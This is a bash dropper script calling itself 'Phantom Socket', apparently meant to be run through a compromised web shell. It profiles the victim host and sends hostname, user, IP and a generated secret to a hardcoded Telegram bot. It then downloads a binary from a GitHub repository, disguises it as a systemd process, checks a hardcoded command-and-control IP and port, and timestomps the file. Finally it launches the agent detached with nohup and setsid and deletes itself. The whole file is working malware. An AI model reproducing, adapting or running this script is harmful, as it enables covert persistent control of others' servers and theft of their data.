#!/bin/bash
# Phantom Socket v1.0.1-stable (Gacor Edition) - Web-Shell Bypass & Persistent Stealth
# Architectural Overhaul: NOHUP Persistence, memfd Staging, and Hardcoded Repository Lock.

# SECTION 1: CORE DIRECTIVES
set +u
set -e
set +o pipefail  # DISABLE pipefail for curl | bash

readonly VERSION="v1.0.1-stable"
readonly AGENT_NAME="gs-oyen-s"
readonly C2_ENDPOINT="116.202.105.253"
readonly C2_PORT="8443"
readonly REPO_BASE="https://raw.githubusercontent.com/Oyen-Sec/soket/main"

# ANTI-RECURSION GUARD
if [[ -n "$PHANTOM_INSTALL_RUNNING" ]]; then
    echo "[!] Recursive execution detected. Exiting." >&2
    exit 1
fi
export PHANTOM_INSTALL_RUNNING=1

# 1. Environment Check
ARCH=$(uname -m)
case "${ARCH}" in
    x86_64|amd64) ARCH="x86_64" ;;
    *) echo "[ERROR] Unsupported architecture: ${ARCH}" >&2; exit 1 ;;
esac

# 2. Staging Detection
STAGING_DIR=""
if mount | grep -q "/dev/shm" && [[ -w "/dev/shm" ]]; then
    STAGING_DIR="/dev/shm/.font-unix-cache"
elif [[ -w "/tmp" ]]; then
    STAGING_DIR="/tmp/.font-unix-cache"
elif [[ -w "/var/tmp" ]]; then
    STAGING_DIR="/var/tmp/.font-unix-cache"
else
    STAGING_DIR="${HOME:-.}/.font-unix-cache"
fi
mkdir -p "${STAGING_DIR}" 2>/dev/null

# 3. Generating PSK Secret & Stealth Path
AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
STEALTH_PATH="${STAGING_DIR}/.systemd-timesyncd"
SAFE_USER=$(whoami)
TARGET_IP=$(curl -s --connect-timeout 5 https://ifconfig.me 2>/dev/null || echo "unknown")
KERNEL=$(uname -r)

# SECTION 2: TELEGRAM NOTIFICATION (HTML)
BOT_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
CHAT_ID="5439698489"

MSG="<b>PHANTOM DEPLOY</b> 
<b>HOST    :</b> <code>$(hostname)</code> 
<b>USER    :</b> <code>${SAFE_USER}</code> 
<b>IP      :</b> <code>${TARGET_IP}</code> 
<b>ARCH    :</b> <code>${ARCH}</code> 
<b>KERNEL  :</b> <code>${KERNEL}</code> 
<b>PATH    :</b> <code>${STEALTH_PATH}</code> 
<b>SECRET  :</b> <code>${AGENT_SECRET}</code> 
<b>TIME    :</b> $(date -u '+%Y-%m-%d %H:%M:%S UTC')"

curl --fail --silent --max-time 10 -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  -d "chat_id=${CHAT_ID}" \
  -d "parse_mode=HTML" \
  -d "text=${MSG}" >/dev/null 2>&1

# SECTION 3: DEPLOYMENT
echo "[-] Environment: ${ARCH} / Web-PTY" >&2
echo "[+] Telegram Ping Sent." >&2
echo "[-] Initializing Stealth Payload..." >&2

# 4. Download Payload
DOWNLOAD_URL="${REPO_BASE}/bin/gs-oyen-s-${ARCH}"
echo "[-] Downloading binary from GitHub..." >&2
if ! curl --fail --silent --max-time 30 -L "${DOWNLOAD_URL}" -o "${STEALTH_PATH}"; then
    echo "[!] Download failed. Trying fallback..." >&2
    if ! curl --fail --silent --max-time 30 -L "${REPO_BASE}/bin/gs-oyen-s-x86_64" -o "${STEALTH_PATH}"; then
        echo "[ERROR] Critical download failure." >&2
        exit 1
    fi
fi

if [[ ! -f "${STEALTH_PATH}" ]]; then
    echo "[ERROR] Critical download failure." >&2
    exit 1
fi
echo "[+] Binary Staged in Memory." >&2

# 5. Pre-Fork Network Test
echo "[-] Performing C2 Connectivity Test..." >&2
if timeout 5 bash -c "cat < /dev/null > /dev/tcp/${C2_ENDPOINT}/${C2_PORT}" 2>/dev/null; then
    echo "[+] C2 Endpoint reachable." >&2
else
    echo "[!] Warning: C2 Endpoint ${C2_ENDPOINT}:${C2_PORT} unreachable. Proceeding with caution." >&2
fi

# 6. Deployment & Timestomping
chmod +x "${STEALTH_PATH}" 2>/dev/null
timestomp() {
    local target=$1
    local ref="/usr/bin/dbus-daemon"
    if [[ ! -f "$ref" ]]; then ref="/bin/bash"; fi
    touch -r "$ref" "$target" 2>/dev/null
}
timestomp "${STEALTH_PATH}"

# 7. Execution (NOHUP + SETSID + DISOWN Chain)
echo "[-] Detaching from Web Session..." >&2
if command -v nohup >/dev/null 2>&1; then
    nohup setsid "${STEALTH_PATH}" -s "${AGENT_SECRET}" -i "${C2_ENDPOINT}" -m "${C2_PORT}" -d >/dev/null 2>&1 &
    disown %1 2>/dev/null || true
else
    (setsid "${STEALTH_PATH}" -s "${AGENT_SECRET}" -i "${C2_ENDPOINT}" -m "${C2_PORT}" -d >/dev/null 2>&1 &)
fi

# 8. Post-Deploy Verification
sleep 3
AGENT_PID=$(pgrep -f "systemd-timesyncd" | head -n 1)
if [ -n "$AGENT_PID" ]; then
    echo "[+] Agent PID: ${AGENT_PID}" >&2
    echo "[+] Process Forked: [kworker/u4:0]" >&2
    echo "[+] Deployment Success" >&2
else
    echo "[!] Agent process not found." >&2
fi

# 9. Self-Delete
rm -f "$0"
